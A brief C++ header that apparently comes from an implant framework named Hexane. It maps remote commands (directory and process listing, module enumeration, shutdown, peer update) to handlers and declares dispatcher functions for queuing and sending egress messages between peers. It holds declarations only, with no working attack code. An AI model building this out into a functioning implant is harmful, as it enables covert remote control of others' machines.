#ifndef HEXANE_CORELIB_MESSAGE_HPP
#define HEXANE_CORELIB_MESSAGE_HPP
#include <core/corelib.hpp>

_code_seg(".rdata") _command_map cmd_map[] = {
    { .name = DIRECTORYLIST,            .address = Commands::DirectoryList },
    { .name = PROCESSMODULES,           .address = Commands::ProcessModules },
    { .name = PROCESSLIST,              .address = Commands::ProcessList },
    { .name = SHUTDOWN,                 .address = Commands::Shutdown },
    { .name = UPDATEPEER,               .address = Commands::UpdatePeer },
    { .name = nullptr,                  .address = nullptr }
};

namespace Dispatcher {
    FUNCTION DWORD PeekPeerId(const _stream *stream);
    FUNCTION VOID AddMessage(_stream *out);
    FUNCTION VOID RemoveMessage(_stream *target);
    FUNCTION VOID OutboundQueue(_stream *out);
    FUNCTION VOID QueueSegments(uint8_t *buffer, uint32_t length);
    FUNCTION VOID PrepareEgressMessage(_stream *out);
    FUNCTION VOID MessageTransmit();
    FUNCTION VOID CommandDispatch (const _stream *in);
}
#endif //HEXANE_CORELIB_MESSAGE_HPP

